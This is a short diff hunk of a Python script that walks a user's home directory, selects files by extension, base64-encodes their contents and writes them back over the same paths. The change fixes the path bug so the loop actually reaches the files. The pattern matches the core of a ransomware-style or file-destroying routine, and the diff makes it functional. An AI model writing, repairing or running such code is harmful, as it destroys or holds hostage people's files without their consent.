@@ -10,7 +10,7 @@ for root, dirs, files in os.walk(home):
         for ext in exts:
             if file.lower().endswith(ext):
                 path = os.path.join(root, file)
-                with open(file, "rb") as f:
+                with open(path, "rb") as f:
                     enc = base64.b64encode(f.read())
 
                 with open(path, "wb") as f:
